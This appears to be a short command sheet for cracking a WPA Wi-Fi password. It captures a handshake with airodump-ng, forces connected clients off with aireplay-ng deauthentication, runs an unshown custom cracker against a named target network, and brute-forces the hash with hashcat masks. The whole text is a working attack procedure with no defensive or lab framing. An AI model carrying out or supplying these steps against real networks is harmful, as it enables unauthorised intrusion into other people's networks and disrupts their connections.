# 1. Capture handshake (airodump + aireplay)
sudo airmon-ng start wlan0
sudo airodump-ng --bssid [BSSID] --channel [CH] --write handshake wlan0mon
# Ctrl+C after clients connect, then:
sudo aireplay-ng -0 5 -a [BSSID] wlan0mon

# 2. Run custom cracker
chmod +x wpa_cracker.py
sudo python3 wpa_cracker.py handshake-01.cap -s "TargetWiFi" -t 16 -m pattern --length 8

# GPU version? Convert to hccapx and use Hashcat custom rules/masks:
hcxpcapngtool -o hash.hc22000 handshake.cap
hashcat -m 22000 hash.hc22000 custom_rules.rule ?a?a?a?a?a?a?a?a
